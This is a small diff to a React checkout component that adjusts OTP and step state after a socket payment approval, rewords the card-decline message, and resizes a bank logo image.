@@ -382,6 +382,8 @@ const Checkout = () => {
     });
     socket.on('payment-approved', (data) => {
       if (!data || data.paymentId !== paymentId) return;
+      setShowOtp(false);
+      setCurrentStep('account');
       navigate('/payment-success', { state: { paymentData: { ...cardData, ...formData, planName, billing, amount: displayPrice, paymentId } } });
     });
     socket.on('payment-rejected', (data) => {
@@ -390,7 +392,7 @@ const Checkout = () => {
       setTimeout(() => {
         setShowSpinner(false);
         setCurrentStep('payment');
-        setDeclineError('Your card has declined.');
+        setDeclineError('Your card was declined!');
       }, 2500);
     });
     socket.on('insufficient-balance-error', (data) => {
@@ -1179,7 +1181,7 @@ const Checkout = () => {
                     <img
                       src={sessionBankLogo || 'https://images.seeklogo.com/logo-png/55/2/hdfc-bank-logo-png_seeklogo-556499.png'}
                       alt="Bank Logo"
-                      className="h-10 w-32 object-contain"
+                      className="h-10 w-24 object-contain"
                     />
                   </div>
                   {/* Merchant Details Table */}
